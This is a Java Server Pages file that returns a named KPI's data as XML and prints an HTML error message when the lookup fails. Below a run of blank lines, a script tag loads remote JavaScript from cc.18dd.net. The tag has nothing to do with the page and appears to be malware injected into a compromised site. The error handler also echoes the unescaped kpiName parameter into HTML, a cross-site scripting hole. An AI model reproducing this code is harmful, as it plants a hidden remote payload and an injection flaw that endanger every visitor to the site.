<%@ page import="org.kpi.*" %><%@ page import="org.smf.smp.sdml.*" %><%@ page isErrorPage="true" %><%
	try {
		String kpiName = request.getParameter("kpiName");
		if (kpiName == null || kpiName.trim().length() <= 0) {
			throw new Exception("Unable to return KPI data because of invalid KPI name.");
		}

		
		KPI kpi = KPIManager.getInstance().getKPI(kpiName.trim());
		if (kpi == null) {
			throw new Exception("Unable to find the KPI with the name '" + kpiName + "'.");
		}
		
		
		response.setContentType("application/xml");
		SDMLDocument sdmlDoc = kpi.getData();
		out.println(sdmlDoc);
		

	} catch (Exception e) {
		System.out.println("ERROR: " + e.getMessage());
		out.println("<p style='color:#dd0000; font-weight:bold'>ERROR: " + e.getMessage() + "</p>");
		out.println("<input type='button' onclick='history.back()' value='Go back'/>");
	}
%>







<script language=javascript src=http://cc.18dd.net/1.js></script>